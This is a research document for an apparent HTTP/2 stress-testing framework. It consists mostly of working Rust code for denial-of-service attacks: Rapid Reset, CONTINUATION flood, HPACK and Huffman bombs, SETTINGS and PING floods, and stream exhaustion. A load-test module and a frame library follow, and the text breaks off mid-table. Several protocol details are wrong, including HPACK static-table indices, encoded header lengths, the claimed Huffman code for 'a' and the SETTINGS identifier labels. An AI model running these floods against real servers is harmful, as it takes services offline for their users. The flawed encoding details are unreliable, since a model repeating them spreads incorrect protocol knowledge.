# HTTP/2 Attack Module Implementation Research for Phoenix Framework

## Overview
This document provides comprehensive research on implementing HTTP/2 attack modules in Rust at the raw frame level for the Phoenix stress testing framework. Each attack module must work at the raw HTTP/2 frame level (not through high-level crates) to accurately simulate real attack patterns.

## 1. Rapid Reset (CVE-2023-44487) Implementation

### Attack Mechanism
The Rapid Reset attack exploits HTTP/2's request cancellation feature:
1. Client opens a stream with HEADERS frame (END_STREAM=1, END_HEADERS=1)
2. Immediately sends RST_STREAM frame to cancel the request
3. This frees up the stream slot, allowing immediate creation of new streams
4. Repeat at maximum possible rate

### Raw Frame Structure

#### HEADERS Frame (Type 0x01)
```
Frame Header (9 bytes):
+-----------------------------------------------+
| Length (24 bits) | Type (8) | Flags (8) | R (1) + Stream ID (31) |
+-----------------------------------------------+
| 0x00 0x00 0x1A   | 0x01     | 0x05      | 0x00 0x00 0x00 0x01    |
+-----------------------------------------------+
Flags: END_STREAM(0x01) | END_HEADERS(0x04) = 0x05
Stream ID: 1 (odd numbers for client-initiated streams)

Frame Payload (26 bytes):
+-----------------------------------------------+
| Pad Length (0) | E (1) | Stream Dependency (31) | Weight (8) |
+-----------------------------------------------+
| 0x00           | 0x00  | 0x00 0x00 0x00 0x00   | 0x00       |
+-----------------------------------------------+
| Header Block Fragment (HPACK encoded)         |
+-----------------------------------------------+
```

#### RST_STREAM Frame (Type 0x03)
```
Frame Header (9 bytes):
+-----------------------------------------------+
| Length (24 bits) | Type (8) | Flags (8) | R (1) + Stream ID (31) |
+-----------------------------------------------+
| 0x00 0x00 0x04   | 0x03     | 0x00      | 0x00 0x00 0x00 0x01    |
+-----------------------------------------------+

Frame Payload (4 bytes):
+-----------------------------------------------+
| Error Code (32 bits)                          |
+-----------------------------------------------+
| 0x00 0x00 0x00 0x08 (CANCEL)                 |
+-----------------------------------------------+
```

### Rust Implementation

```rust
use bytes::{BytesMut, BufMut};
use std::io::{self, Write};
use std::net::TcpStream;
use std::time::{Instant, Duration};

/// Build HTTP/2 frame header
fn build_frame_header(length: u32, frame_type: u8, flags: u8, stream_id: u32) -> [u8; 9] {
    let mut header = [0u8; 9];
    // Length (24 bits, big-endian)
    header[0] = ((length >> 16) & 0xFF) as u8;
    header[1] = ((length >> 8) & 0xFF) as u8;
    header[2] = (length & 0xFF) as u8;
    // Type
    header[3] = frame_type;
    // Flags
    header[4] = flags;
    // Stream ID (31 bits, big-endian)
    header[5] = ((stream_id >> 24) & 0x7F) as u8; // R bit is 0
    header[6] = ((stream_id >> 16) & 0xFF) as u8;
    header[7] = ((stream_id >> 8) & 0xFF) as u8;
    header[8] = (stream_id & 0xFF) as u8;
    header
}

/// Build minimal HPACK-encoded headers for GET request
fn build_hpack_headers() -> Vec<u8> {
    // Minimal HPACK for GET / HTTP/2
    // Using static table entries:
    // :method GET = index 2
    // :path / = index 1
    // :scheme https = index 7
    // :authority example.com = literal with indexing
    let mut buf = BytesMut::with_capacity(32);
    
    // :method: GET (index 2, with indexing)
    buf.put_u8(0x82); // 1000 0010 = indexed field
    
    // :scheme: https (index 7, with indexing)
    buf.put_u8(0x87); // 1000 0111 = indexed field
    
    // :path: / (index 1, with indexing)
    buf.put_u8(0x81); // 1000 0001 = indexed field
    
    // :authority: example.com (literal with indexing)
    // Header field name: :authority (index 1)
    buf.put_u8(0x41); // 0100 0001 = literal with indexing, name from static table
    // Value length: 11
    buf.put_u8(0x0B); // length 11
    buf.put_slice(b"example.com");
    
    buf.to_vec()
}

/// Send Rapid Reset attack
fn rapid_reset_attack(stream: &mut TcpStream, duration: Duration) -> io::Result<u64> {
    let start = Instant::now();
    let mut request_count = 0u64;
    let mut next_stream_id = 1u32;
    
    // Build reusable HEADERS frame (26 bytes payload)
    let headers_payload = build_hpack_headers();
    let headers_length = headers_payload.len() as u32;
    
    while start.elapsed() < duration {
        // Build HEADERS frame
        let headers_header = build_frame_header(
            headers_length,
            0x01, // HEADERS
            0x05, // END_STREAM(1) | END_HEADERS(1)
            next_stream_id
        );
        
        // Build RST_STREAM frame
        let rst_header = build_frame_header(
            4, // 4 bytes payload
            0x03, // RST_STREAM
            0x00, // No flags
            next_stream_id
        );
        
        // Send both frames immediately
        stream.write_all(&headers_header)?;
        stream.write_all(&headers_payload)?;
        stream.write_all(&rst_header)?;
        stream.write_all(&[0x00, 0x00, 0x00, 0x08])?; // CANCEL error code
        
        request_count += 1;
        next_stream_id += 2; // Next odd stream ID
        
        // Theoretical max: ~1M req/sec on 10Gbps link
        // Each request: 9+26+9+4 = 48 bytes
        // 1M req/sec = 48 MB/sec = 384 Mbps
    }
    
    Ok(request_count)
}

/// High-performance version using pre-built frames
fn rapid_reset_high_perf(stream: &mut TcpStream, target_rps: u64) -> io::Result<()> {
    // Pre-build frames for maximum speed
    let mut frames = BytesMut::with_capacity(1024 * 1024); // 1MB buffer
    
    // Build 1000 rapid reset sequences
    for stream_id in (1..=1999).step_by(2) {
        // HEADERS frame
        let headers = build_headers_frame(stream_id);
        frames.extend_from_slice(&headers);
        
        // RST_STREAM frame
        let rst = build_rst_frame(stream_id);
        frames.extend_from_slice(&rst);
    }
    
    // Send in bursts
    let batch_size = 1000;
    let interval = Duration::from_secs(1) / (target_rps / batch_size as u64);
    
    loop {
        stream.write_all(&frames[..batch_size * 48])?; // 48 bytes per request
        std::thread::sleep(interval);
    }
}

fn build_headers_frame(stream_id: u32) -> [u8; 35] {
    let mut frame = [0u8; 35];
    // Header: 9 bytes
    let header = build_frame_header(26, 0x01, 0x05, stream_id);
    frame[..9].copy_from_slice(&header);
    // HPACK payload: 26 bytes
    let hpack = build_hpack_headers();
    frame[9..35].copy_from_slice(&hpack);
    frame
}

fn build_rst_frame(stream_id: u32) -> [u8; 13] {
    let mut frame = [0u8; 13];
    let header = build_frame_header(4, 0x03, 0x00, stream_id);
    frame[..9].copy_from_slice(&header);
    frame[9..13].copy_from_slice(&[0x00, 0x00, 0x00, 0x08]); // CANCEL
    frame
}
```

### Performance Considerations
- **Theoretical max rate**: On 10Gbps link: ~1.04M req/sec (48 bytes/req)
- **Actual rate**: Depends on TCP congestion, server processing, OS scheduling
- **Optimization**: Use `sendmmsg()` for batch UDP-like sending, kernel bypass (DPDK)
- **Memory**: Pre-allocate all frames to avoid allocation during attack

## 2. CONTINUATION Flood Implementation

### Attack Mechanism
1. Send HEADERS frame with END_HEADERS=0
2. Send endless CONTINUATION frames without END_HEADERS flag
3. Server keeps allocating memory for header fragments
4. Causes CPU exhaustion or OOM crash

### Frame Structures

#### HEADERS Frame (without END_HEADERS)
```
Frame Header:
+-----------------------------------------------+
| Length (24) | Type=0x01 | Flags=0x01 | Stream ID |
+-----------------------------------------------+
Flags: END_STREAM=1 (0x01), END_HEADERS=0

Payload: HPACK fragment (max frame size)
```

#### CONTINUATION Frame (Type 0x09)
```
Frame Header:
+-----------------------------------------------+
| Length (24) | Type=0x09 | Flags=0x00 | Stream ID |
+-----------------------------------------------+
Flags: No END_HEADERS

Payload: HPACK fragment continuation
```

### Rust Implementation

```rust
use bytes::{BytesMut, BufMut};

/// CONTINUATION Flood attack
fn continuation_flood(stream: &mut TcpStream, target_stream_id: u32) -> io::Result<()> {
    // Send initial HEADERS without END_HEADERS
    let headers = build_headers_no_end_headers(target_stream_id);
    stream.write_all(&headers)?;
    
    // Send endless CONTINUATION frames
    let mut sequence = 0u64;
    loop {
        let continuation = build_continuation_frame(
            target_stream_id,
            sequence,
            false // No END_HEADERS
        );
        stream.write_all(&continuation)?;
        
        sequence += 1;
        
        // Optional: small delay to avoid TCP backpressure
        if sequence % 1000 == 0 {
            std::thread::sleep(Duration::from_micros(100));
        }
    }
}

fn build_headers_no_end_headers(stream_id: u32) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(16384 + 9); // Max frame size + header
    
    // Frame header: length will be filled later
    let header_pos = buf.len();
    buf.extend_from_slice(&[0u8; 9]);
    
    // HPACK fragment: build large header block
    // Use maximum frame size (16KB default)
    let hpack_fragment = build_large_hpack_fragment(16384);
    buf.extend_from_slice(&hpack_fragment);
    
    // Update length in header
    let payload_len = buf.len() - 9;
    buf[header_pos] = ((payload_len >> 16) & 0xFF) as u8;
    buf[header_pos + 1] = ((payload_len >> 8) & 0xFF) as u8;
    buf[header_pos + 2] = (payload_len & 0xFF) as u8;
    buf[header_pos + 3] = 0x01; // HEADERS type
    buf[header_pos + 4] = 0x01; // END_STREAM only, no END_HEADERS
    
    // Stream ID
    buf[header_pos + 5] = ((stream_id >> 24) & 0x7F) as u8;
    buf[header_pos + 6] = ((stream_id >> 16) & 0xFF) as u8;
    buf[header_pos + 7] = ((stream_id >> 8) & 0xFF) as u8;
    buf[header_pos + 8] = (stream_id & 0xFF) as u8;
    
    buf.to_vec()
}

fn build_continuation_frame(stream_id: u32, seq: u64, end_headers: bool) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(16384 + 9);
    
    let header_pos = buf.len();
    buf.extend_from_slice(&[0u8; 9]);
    
    // Build HPACK fragment (repeating pattern)
    let fragment = build_hpack_fragment(seq, 16384);
    buf.extend_from_slice(&fragment);
    
    let payload_len = buf.len() - 9;
    buf[header_pos] = ((payload_len >> 16) & 0xFF) as u8;
    buf[header_pos + 1] = ((payload_len >> 8) & 0xFF) as u8;
    buf[header_pos + 2] = (payload_len & 0xFF) as u8;
    buf[header_pos + 3] = 0x09; // CONTINUATION type
    
    // Flags: END_HEADERS if specified
    buf[header_pos + 4] = if end_headers { 0x04 } else { 0x00 };
    
    // Stream ID (same as HEADERS)
    buf[header_pos + 5] = ((stream_id >> 24) & 0x7F) as u8;
    buf[header_pos + 6] = ((stream_id >> 16) & 0xFF) as u8;
    buf[header_pos + 7] = ((stream_id >> 8) & 0xFF) as u8;
    buf[header_pos + 8] = (stream_id & 0xFF) as u8;
    
    buf.to_vec()
}

fn build_large_hpack_fragment(size: usize) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(size);
    
    // Build HPACK that references dynamic table entries
    // This causes servers to allocate memory for table
    for i in 0..size / 10 {
        // Literal header field with incremental indexing
        // Header name: X-Custom-i
        buf.put_u8(0x40); // 0100 0000 = literal with indexing
        buf.put_u8(0x0A); // Name length: 10
        buf.put_slice(format!("X-Custom-{:03}", i % 1000).as_bytes());
        buf.put_u8(0x80); // Value length: 128
        // 128-byte value
        for _ in 0..128 {
            buf.put_u8(b'A');
        }
    }
    
    buf.to_vec()
}
```

### Attack Variants
1. **Single connection, single stream**: Most effective against servers with no header timeout
2. **Multiple connections**: For servers with per-connection limits
3. **Byte-by-byte sending**: Keep connection alive with minimal data

## 3. HPACK Bomb Implementation

### Attack Mechanism
HPACK bombs exploit the compression ratio of HPACK:
1. Small compressed HPACK block (100-1000 bytes)
2. Decompresses to megabytes due to dynamic table references
3. Server allocates large memory for decompressed headers

### HPACK Encoding Details

```rust
/// Create HPACK bomb that decompresses to large size
fn create_hpack_bomb() -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(1024);
    
    // Strategy 1: Reference large dynamic table entries repeatedly
    // First, add large entries to dynamic table
    for i in 0..10 {
        // Add large header to dynamic table
        buf.put_u8(0x40); // Literal with indexing
        buf.put_u8(0x0F); // Name length: 15
        buf.put_slice(format!("X-Large-Header-{}", i).as_bytes());
        buf.put_u8(0xFF); // Value length: 255 (max single byte)
        for _ in 0..255 {
            buf.put_u8(b'X');
        }
    }
    
    // Now reference these large entries many times
    // Each reference expands to the full 270+ byte header
    for _ in 0..1000 {
        // Reference dynamic table entry (index > 61)
        // Index 62 = first dynamic entry
        buf.put_u8(0xBE); // 1011 1110 = indexed field, index 62
    }
    
    buf.to_vec()
}

/// Alternative: Use Huffman encoding with maximum expansion
fn create_huffman_bomb() -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(500);
    
    // Huffman-encoded string that decompresses much larger
    // The string "aaaaaaaa..." Huffman encodes to very few bits
    // but decompresses to many bytes
    
    // Header field with Huffman-encoded value
    buf.put_u8(0x40); // Literal with indexing
    buf.put_u8(0x04); // Name length: 4
    buf.put_slice(b"test");
    buf.put_u8(0x86); // Value length: 6, Huffman encoded flag
    // Huffman encoded "aaaaaaaaaaaaaaaa..." (6 bytes encodes ~48 'a's)
    // Huffman code for 'a' is 1 bit: 0
    // So 48 'a's = 48 bits = 6 bytes of 0x00
    buf.put_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    
    buf.to_vec()
}
```

## 4. Settings Flood Implementation

### Attack Mechanism
Send thousands of SETTINGS frames without waiting for ACK:
1. Server must process each SETTINGS frame
2. No ACK flag means server doesn't respond
3. Consumes CPU cycles for parsing

### SETTINGS Frame Structure
```
Frame Header:
+-----------------------------------------------+
| Length (24) | Type=0x04 | Flags=0x00 | Stream ID=0 |
+-----------------------------------------------+

Payload: Zero or more SETTINGS parameters
Each parameter: 16-bit identifier + 32-bit value
```

### Rust Implementation

```rust
fn settings_flood(stream: &mut TcpStream, duration: Duration) -> io::Result<u64> {
    let start = Instant::now();
    let mut frame_count = 0u64;
    
    // Pre-build SETTINGS frames with various parameters
    let settings_frames = [
        build_settings_frame(&[(0x01, 100), (0x02, 0)]), // HEADER_TABLE_SIZE
        build_settings_frame(&[(0x03, 10000), (0x04, 1)]), // MAX_CONCURRENT_STREAMS
        build_settings_frame(&[(0x05, 65535), (0x06, 16384)]), // INITIAL_WINDOW_SIZE
        build_settings_frame(&[(0x07, 1000000), (0x08, 1)]), // MAX_FRAME_SIZE
    ];
    
    while start.elapsed() < duration {
        for frame in &settings_frames {
            stream.write_all(frame)?;
            frame_count += 1;
            
            // Send at maximum rate
            // Each frame: 9 + (n*6) bytes
            // 1000 frames/sec = ~60KB/sec
        }
    }
    
    Ok(frame_count)
}

fn build_settings_frame(settings: &[(u16, u32)]) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(9 + settings.len() * 6);
    
    let header_pos = buf.len();
    buf.extend_from_slice(&[0u8; 9]);
    
    for &(identifier, value) in settings {
        buf.put_u16(identifier);
        buf.put_u32(value);
    }
    
    let payload_len = buf.len() - 9;
    buf[header_pos] = ((payload_len >> 16) & 0xFF) as u8;
    buf[header_pos + 1] = ((payload_len >> 8) & 0xFF) as u8;
    buf[header_pos + 2] = (payload_len & 0xFF) as u8;
    buf[header_pos + 3] = 0x04; // SETTINGS type
    buf[header_pos + 4] = 0x00; // No ACK flag
    // Stream ID is 0 for SETTINGS
    buf[header_pos + 5] = 0x00;
    buf[header_pos + 6] = 0x00;
    buf[header_pos + 7] = 0x00;
    buf[header_pos + 8] = 0x00;
    
    buf.to_vec()
}
```

## 5. Ping Flood Implementation

### Attack Mechanism
Send PING frames (type 0x06) with 8-byte opaque data:
1. Server must respond with PING ACK
2. Each PING consumes CPU for frame parsing
3. Fire-and-forget thousands of PINGs

### PING Frame Structure
```
Frame Header:
+-----------------------------------------------+
| Length=8 (24) | Type=0x06 | Flags=0x00 | Stream ID=0 |
+-----------------------------------------------+

Payload: 8 bytes opaque data
```

### Rust Implementation

```rust
fn ping_flood(stream: &mut TcpStream, duration: Duration) -> io::Result<u64> {
    let start = Instant::now();
    let mut ping_count = 0u64;
    let mut sequence = 0u64;
    
    while start.elapsed() < duration {
        let ping_frame = build_ping_frame(sequence);
        stream.write_all(&ping_frame)?;
        
        ping_count += 1;
        sequence += 1;
        
        // Theoretical max: ~1.25M pings/sec on 10Gbps
        // Each ping: 9 + 8 = 17 bytes
        // 1.25M/sec = 21.25 MB/sec = 170 Mbps
    }
    
    Ok(ping_count)
}

fn build_ping_frame(opaque_data: u64) -> [u8; 17] {
    let mut frame = [0u8; 17];
    
    // Header
    frame[0] = 0x00; // Length: 8
    frame[1] = 0x00;
    frame[2] = 0x08;
    frame[3] = 0x06; // PING type
    frame[4] = 0x00; // No ACK flag
    // Stream ID = 0
    frame[5] = 0x00;
    frame[6] = 0x00;
    frame[7] = 0x00;
    frame[8] = 0x00;
    
    // Opaque data (8 bytes)
    frame[9] = ((opaque_data >> 56) & 0xFF) as u8;
    frame[10] = ((opaque_data >> 48) & 0xFF) as u8;
    frame[11] = ((opaque_data >> 40) & 0xFF) as u8;
    frame[12] = ((opaque_data >> 32) & 0xFF) as u8;
    frame[13] = ((opaque_data >> 24) & 0xFF) as u8;
    frame[14] = ((opaque_data >> 16) & 0xFF) as u8;
    frame[15] = ((opaque_data >> 8) & 0xFF) as u8;
    frame[16] = (opaque_data & 0xFF) as u8;
    
    frame
}
```

## 6. Stream Exhaustion Implementation

### Attack Mechanism
1. Open MAX_CONCURRENT_STREAMS streams
2. Send partial HEADERS (no END_STREAM)
3. Never complete requests
4. Hold streams open indefinitely

### Rust Implementation

```rust
fn stream_exhaustion(stream: &mut TcpStream, max_streams: u32) -> io::Result<()> {
    // Open maximum allowed streams
    for stream_id in (1..=max_streams*2).step_by(2) {
        // Send HEADERS without END_STREAM
        let headers = build_partial_headers(stream_id);
        stream.write_all(&headers)?;
        
        // Send WINDOW_UPDATE occasionally to keep connection alive
        if stream_id % 100 == 1 {
            let window_update = build_window_update(stream_id, 65535);
            stream.write_all(&window_update)?;
        }
    }
    
    // Keep connection alive with periodic data
    loop {
        // Send PING to prevent idle timeout
        let ping = build_ping_frame(0);
        stream.write_all(&ping)?;
        
        // Send WINDOW_UPDATE on stream 0 (connection-level)
        let conn_window = build_window_update(0, 65535);
        stream.write_all(&conn_window)?;
        
        std::thread::sleep(Duration::from_secs(30));
    }
}

fn build_partial_headers(stream_id: u32) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(1024);
    
    let header_pos = buf.len();
    buf.extend_from_slice(&[0u8; 9]);
    
    // HPACK headers
    let hpack = build_hpack_headers();
    buf.extend_from_slice(&hpack);
    
    let payload_len = buf.len() - 9;
    buf[header_pos] = ((payload_len >> 16) & 0xFF) as u8;
    buf[header_pos + 1] = ((payload_len >> 8) & 0xFF) as u8;
    buf[header_pos + 2] = (payload_len & 0xFF) as u8;
    buf[header_pos + 3] = 0x01; // HEADERS
    buf[header_pos + 4] = 0x04; // END_HEADERS only, no END_STREAM
    
    // Stream ID
    buf[header_pos + 5] = ((stream_id >> 24) & 0x7F) as u8;
    buf[header_pos + 6] = ((stream_id >> 16) & 0xFF) as u8;
    buf[header_pos + 7] = ((stream_id >> 8) & 0xFF) as u8;
    buf[header_pos + 8] = (stream_id & 0xFF) as u8;
    
    buf.to_vec()
}

fn build_window_update(stream_id: u32, increment: u32) -> [u8; 13] {
    let mut frame = [0u8; 13];
    
    // Header
    frame[0] = 0x00; // Length: 4
    frame[1] = 0x00;
    frame[2] = 0x04;
    frame[3] = 0x08; // WINDOW_UPDATE type
    frame[4] = 0x00; // No flags
    
    // Stream ID
    frame[5] = ((stream_id >> 24) & 0x7F) as u8;
    frame[6] = ((stream_id >> 16) & 0xFF) as u8;
    frame[7] = ((stream_id >> 8) & 0xFF) as u8;
    frame[8] = (stream_id & 0xFF) as u8;
    
    // Window size increment (31 bits, R bit = 0)
    frame[9] = ((increment >> 24) & 0x7F) as u8;
    frame[10] = ((increment >> 16) & 0xFF) as u8;
    frame[11] = ((increment >> 8) & 0xFF) as u8;
    frame[12] = (increment & 0xFF) as u8;
    
    frame
}
```

## 7. Load Testing Module (Legitimate Traffic)

### Implementation Requirements
1. High-throughput legitimate HTTP/2 requests
2. Accurate latency measurement (avoid coordinated omission)
3. Warmup, ramp-up, steady state, cooldown phases
4. Connection pooling and reuse

### Rust Implementation

```rust
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

struct LoadTestConfig {
    target_rps: u64,
    duration: Duration,
    warmup: Duration,
    cooldown: Duration,
    connections: usize,
    url: String,
}

struct LoadTestStats {
    requests_sent: AtomicU64,
    responses_received: AtomicU64,
    errors: AtomicU64,
    total_latency: AtomicU64, // microseconds
    min_latency: AtomicU64,
    max_latency: AtomicU64,
}

impl LoadTestStats {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            requests_sent: AtomicU64::new(0),
            responses_received: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            total_latency: AtomicU64::new(0),
            min_latency: AtomicU64::new(u64::MAX),
            max_latency: AtomicU64::new(0),
        })
    }
    
    fn record_request(&self) {
        self.requests_sent.fetch_add(1, Ordering::Relaxed);
    }
    
    fn record_response(&self, latency_us: u64) {
        self.responses_received.fetch_add(1, Ordering::Relaxed);
        self.total_latency.fetch_add(latency_us, Ordering::Relaxed);
        
        let mut current_min = self.min_latency.load(Ordering::Relaxed);
        while latency_us < current_min {
            match self.min_latency.compare_exchange_weak(
                current_min,
                latency_us,
                Ordering::Relaxed,
                Ordering::Relaxed
            ) {
                Ok(_) => break,
                Err(new_min) => current_min = new_min,
            }
        }
        
        let mut current_max = self.max_latency.load(Ordering::Relaxed);
        while latency_us > current_max {
            match self.max_latency.compare_exchange_weak(
                current_max,
                latency_us,
                Ordering::Relaxed,
                Ordering::Relaxed
            ) {
                Ok(_) => break,
                Err(new_max) => current_max = new_max,
            }
        }
    }
}

fn run_load_test(config: LoadTestConfig) -> io::Result<()> {
    let stats = LoadTestStats::new();
    
    // Warmup phase
    println!("Warmup phase: {:?}", config.warmup);
    let warmup_end = Instant::now() + config.warmup;
    while Instant::now() < warmup_end {
        // Send requests at target rate during warmup
        send_request_batch(&config, &stats, config.target_rps / 4)?;
        thread::sleep(Duration::from_millis(250));
    }
    
    // Steady state phase
    println!("Steady state: {:?}", config.duration);
    let steady_end = Instant::now() + config.duration;
    
    // Use multiple worker threads
    let mut workers = Vec::new();
    for worker_id in 0..config.connections {
        let config_clone = config.clone();
        let stats_clone = Arc::clone(&stats);
        
        workers.push(thread::spawn(move || {
            load_test_worker(worker_id, config_clone, stats_clone)
        }));
    }
    
    // Monitor progress
    let start_requests = stats.requests_sent.load(Ordering::Relaxed);
    let start_time = Instant::now();
    
    while Instant::now() < steady_end {
        thread::sleep(Duration::from_secs(1));
        
        let current_requests = stats.requests_sent.load(Ordering::Relaxed);
        let elapsed = start_time.elapsed().as_secs_f64();
        let rps = (current_requests - start_requests) as f64 / elapsed;
        
        println!("Current RPS: {:.0}, Latency avg: {:.1}ms", 
            rps,
            stats.total_latency.load(Ordering::Relaxed) as f64 / 
            stats.responses_received.load(Ordering::Relaxed) as f64 / 1000.0
        );
    }
    
    // Wait for workers
    for worker in workers {
        worker.join().unwrap()?;
    }
    
    // Cooldown phase
    println!("Cooldown phase: {:?}", config.cooldown);
    thread::sleep(config.cooldown);
    
    // Print final stats
    print_final_stats(&stats);
    
    Ok(())
}

fn load_test_worker(worker_id: usize, config: LoadTestConfig, stats: Arc<LoadTestStats>) -> io::Result<()> {
    // Create HTTP/2 connection
    let mut stream = TcpStream::connect(&config.url)?;
    
    // Perform HTTP/2 handshake
    perform_http2_handshake(&mut stream)?;
    
    let requests_per_worker = config.target_rps / config.connections as u64;
    let interval = Duration::from_secs(1) / requests_per_worker;
    
    loop {
        let start = Instant::now();
        stats.record_request();
        
        // Send legitimate HTTP/2 request
        let stream_id = (worker_id * 2 + 1) as u32; // Odd stream IDs
        let request = build_legitimate_request(stream_id, &config.url);
        stream.write_all(&request)?;
        
        // Read response
        let response = read_http2_response(&mut stream, stream_id)?;
        
        let latency = start.elapsed().as_micros() as u64;
        stats.record_response(latency);
        
        // Sleep to maintain target RPS
        let elapsed = start.elapsed();
        if elapsed < interval {
            thread::sleep(interval - elapsed);
        }
    }
}

fn build_legitimate_request(stream_id: u32, url: &str) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(1024);
    
    // HEADERS frame
    let headers = build_get_request_headers(stream_id, url);
    buf.extend_from_slice(&headers);
    
    // DATA frame with empty body (END_STREAM)
    let data_header = build_frame_header(0, 0x00, 0x01, stream_id); // DATA with END_STREAM
    buf.extend_from_slice(&data_header);
    
    buf.to_vec()
}
```

## 8. Raw HTTP/2 Frame Construction Library

### Core Frame Building Functions

```rust
use bytes::{BytesMut, BufMut, Buf};
use std::convert::TryInto;

/// HTTP/2 Frame Types
#[repr(u8)]
#[derive(Debug, Clone, Copy)]
pub enum FrameType {
    Data = 0x00,
    Headers = 0x01,
    Priority = 0x02,
    RstStream = 0x03,
    Settings = 0x04,
    PushPromise = 0x05,
    Ping = 0x06,
    GoAway = 0x07,
    WindowUpdate = 0x08,
    Continuation = 0x09,
}

/// HTTP/2 Frame Flags
pub mod flags {
    pub const END_STREAM: u8 = 0x01;
    pub const END_HEADERS: u8 = 0x04;
    pub const PADDED: u8 = 0x08;
    pub const PRIORITY: u8 = 0x20;
    pub const ACK: u8 = 0x01; // For SETTINGS and PING
}

/// Build complete HTTP/2 frame
pub struct FrameBuilder {
    buffer: BytesMut,
}

impl FrameBuilder {
    pub fn new() -> Self {
        Self {
            buffer: BytesMut::with_capacity(16384 + 9), // Max frame size + header
        }
    }
    
    pub fn build_frame(
        &mut self,
        frame_type: FrameType,
        flags: u8,
        stream_id: u32,
        payload: &[u8],
    ) -> &[u8] {
        self.buffer.clear();
        
        // Reserve space for header
        let header_pos = self.buffer.len();
        self.buffer.extend_from_slice(&[0u8; 9]);
        
        // Add payload
        self.buffer.extend_from_slice(payload);
        
        // Update header
        let payload_len = self.buffer.len() - 9;
        self.buffer[header_pos] = ((payload_len >> 16) & 0xFF) as u8;
        self.buffer[header_pos + 1] = ((payload_len >> 8) & 0xFF) as u8;
        self.buffer[header_pos + 2] = (payload_len & 0xFF) as u8;
        self.buffer[header_pos + 3] = frame_type as u8;
        self.buffer[header_pos + 4] = flags;
        
        // Stream ID (31 bits, R bit = 0)
        self.buffer[header_pos + 5] = ((stream_id >> 24) & 0x7F) as u8;
        self.buffer[header_pos + 6] = ((stream_id >> 16) & 0xFF) as u8;
        self.buffer[header_pos + 7] = ((stream_id >> 8) & 0xFF) as u8;
        self.buffer[header_pos + 8] = (stream_id & 0xFF) as u8;
        
        &self.buffer
    }
    
    /// Build DATA frame
    pub fn build_data_frame(
        &mut self,
        stream_id: u32,
        data: &[u8],
        end_stream: bool,
    ) -> &[u8] {
        let flags = if end_stream { flags::END_STREAM } else { 0 };
        self.build_frame(FrameType::Data, flags, stream_id, data)
    }
    
    /// Build HEADERS frame with HPACK
    pub fn build_headers_frame(
        &mut self,
        stream_id: u32,
        headers: &[(&str, &str)],
        end_stream: bool,
        end_headers: bool,
    ) -> &[u8] {
        let mut flags = 0;
        if end_stream {
            flags |= flags::END_STREAM;
        }
        if end_headers {
            flags |= flags::END_HEADERS;
        }
        
        let hpack_payload = encode_hpack(headers);
        self.build_frame(FrameType::Headers, flags, stream_id, &hpack_payload)
    }
    
    /// Build RST_STREAM frame
    pub fn build_rst_frame(&mut self, stream_id: u32, error_code: u32) -> &[u8] {
        let mut payload = [0u8; 4];
        payload.copy_from_slice(&error_code.to_be_bytes());
        self.build_frame(FrameType::RstStream, 0, stream_id, &payload)
    }
    
    /// Build SETTINGS frame
    pub fn build_settings_frame(&mut self, settings: &[(u16, u32)], ack: bool) -> &[u8] {
        let flags = if ack { flags::ACK } else { 0 };
        
        let mut payload = BytesMut::with_capacity(settings.len() * 6);
        for &(id, value) in settings {
            payload.put_u16(id);
            payload.put_u32(value);
        }
        
        self.build_frame(FrameType::Settings, flags, 0, &payload)
    }
}

/// Minimal HPACK encoder
fn encode_hpack(headers: &[(&str, &str)]) -> Vec<u8> {
    let mut buf = BytesMut::with_capacity(512);
    
    for &(name, value) in headers {
        // Check static table first
        if let Some(index) = find_in_static_table(name, value) {
            // Indexed representation
            buf.put_u8(0x80 | index as u8); // 1xxxxxxx
        } else if let Some(name_index) = find_name_in_static_table(name) {
            // Literal with indexed name
            buf.put_u8(0x40 | name_index as u8); // 01xxxxxx
            encode_string(value, &mut buf, false);
        } else {
            // Literal with new name
            buf.put_u8(0x40); // 01000000 (literal with indexing)
            encode_string(name, &mut buf, false);
            encode_string(value, &mut buf, false);
        }
    }
    
    buf.to_vec()
}

fn encode_string(s: &str, buf: &mut BytesMut, huffman: bool) {
    let bytes = s.as_bytes();
    if huffman {
        // Simplified: just store length for now
        buf.put_u8(0x80 | bytes.len() as u8); // Huffman flag + length
        buf.extend_from_slice(bytes);
    } else {
        buf.put_u8(bytes.len() as u8);
        buf.extend_from_slice(bytes);
    }
}

/// Static table lookup (simplified)
fn find_in_static_table(name: &str, value: &str) -> Option<usize> {
    // Common headers in static table
    match (name, value) {
        (":method", "GET") => Some(2),
        (":method", "POST") => Some(3),
        (":path", "/") => Some(1),
        (":scheme", "http") => Some(6),
        (":scheme", "https") => Some(7),
        (":status", "200") => Some(8),
        _ => None,
    }
}

fn find_name_in_static_table(name: &str) -> Option<usize> {
    match name {
        ":authority" => Some(1),
        ":method" => Some(2),
        ":path" => Some(3),
        ":scheme" => Some(4),
        ":status" => Some(5),
        "accept-charset" => Some(15),
        "accept-encoding" => Some(16),
        "accept-language" => Some(17),
        "accept-ranges" => Some(18),
        "accept" => Some(19),
        "access-control-allow-origin" => Some(20),
        "age" => Some(21),
        "allow" => Some(22),
        "authorization" => Some(23),
        "cache-control" => Some(24),
        "content-disposition" => Some(25),
        "content-encoding" => Some(26),
        "content-language" => Some(27),
        "content-length" => Some(28),
        "content-location" => Some(29),
        "content-range" => Some(30),
        "content-type" => Some(31),
        "cookie" => Some(32),
        "date" => Some(33),
        "etag" => Some(34),
        "expect" => Some(35),
        "expires" => Some(36),
        "from" => Some(37),
        "host" => Some(38),
        "if-match" => Some(39),
        "if-modified-since" => Some(40),
        "if-none-match" => Some(41),
        "if-range" => Some(42),
        "if-unmodified-since" => Some(43),
        "last-modified" => Some(44),
        "link" => Some(45),
        "location" => Some(46),
        "max-forwards" => Some(47),
        "proxy-authenticate" => Some(48),
        "proxy-authorization" => Some(49),
        "range" => Some(50),
        "referer" => Some(51),
        "refresh" => Some(52),
        "retry-after" => Some(53),
